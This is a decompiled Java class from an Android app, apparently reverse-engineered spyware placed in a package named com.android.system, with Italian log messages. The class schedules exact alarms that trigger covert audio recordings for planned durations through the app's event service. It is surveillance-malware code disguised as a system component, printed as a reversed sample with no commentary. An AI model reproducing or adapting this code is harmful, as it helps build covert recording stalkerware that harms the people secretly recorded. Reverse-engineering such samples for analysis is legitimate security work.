package com.android.system;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import com.app.system.common.commands.StartAudioRec;
import com.app.system.common.entity.PlannedRec;
import com.app.system.common.h.m;
import com.app.system.common.service.EventsAndReceiveService;
import java.text.SimpleDateFormat;
import java.util.Date;

public class PlannedRecTrigger
  extends BroadcastReceiver
{
  private static final SimpleDateFormat a = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
  
  public static void a(Context paramContext, long paramLong)
  {
    PlannedRec localPlannedRec = new m(paramContext).a(paramLong);
    if (localPlannedRec == null)
    {
      paramContext = new StringBuilder();
      paramContext.append("PLANNED REC ");
      paramContext.append(paramLong);
      paramContext.append(" NON TROVATO!");
      com.security.d.a.a("PlannedRecTrigger", paramContext.toString(), new Object[0]);
    }
    else if (localPlannedRec.status != 1)
    {
      paramContext = new StringBuilder();
      paramContext.append("PLANNED REC ");
      paramContext.append(paramLong);
      paramContext.append(" status=");
      paramContext.append(PlannedRec.a(localPlannedRec.status));
      paramContext.append(": REGISTRAZIONE NON AVVIATA");
      com.security.d.a.a("PlannedRecTrigger", paramContext.toString(), new Object[0]);
    }
    else
    {
      StartAudioRec.a(paramContext, localPlannedRec.plannedDur, -1, localPlannedRec);
    }
  }
  
  public static void a(Context paramContext, PlannedRec paramPlannedRec)
  {
    Object localObject = new StringBuilder();
    ((StringBuilder)localObject).append("Pianifico ragistrazione start=");
    ((StringBuilder)localObject).append(a.format(new Date(paramPlannedRec.plannedStart * 1000L)));
    ((StringBuilder)localObject).append(" dur=");
    ((StringBuilder)localObject).append(paramPlannedRec.plannedDur);
    com.security.d.a.d("PlannedRecTrigger", ((StringBuilder)localObject).toString(), new Object[0]);
    localObject = b(paramContext, paramPlannedRec);
    localObject = PendingIntent.getBroadcast(paramContext, (int)paramPlannedRec.rowId, (Intent)localObject, 0);
    ((AlarmManager)paramContext.getSystemService("alarm")).setExact(0, paramPlannedRec.plannedStart * 1000L, (PendingIntent)localObject);
  }
  
  private static Intent b(Context paramContext, PlannedRec paramPlannedRec)
  {
    paramContext = new Intent(paramContext, PlannedRecTrigger.class);
    paramContext.putExtra("planned-rowid", paramPlannedRec.rowId);
    paramContext.putExtra("planned-start", paramPlannedRec.plannedStart);
    paramContext.putExtra("planned-dur", paramPlannedRec.plannedDur);
    return paramContext;
  }
  
  public void onReceive(Context paramContext, Intent paramIntent)
  {
    com.security.d.a.d("PlannedRecTrigger", "ALARM received!", new Object[0]);
    long l = paramIntent.getLongExtra("planned-rowid", 0L);
    paramIntent = new Intent(paramContext, EventsAndReceiveService.class);
    paramIntent.putExtra("event_core_app", "event_planned_rec");
    paramIntent.putExtra("planned-rowid", l);
    com.b.a.a.a.a(paramContext, paramIntent);
  }
}


/* Location:              ~/com/android/system/PlannedRecTrigger.class
 *
 * Reversed by:           J
 */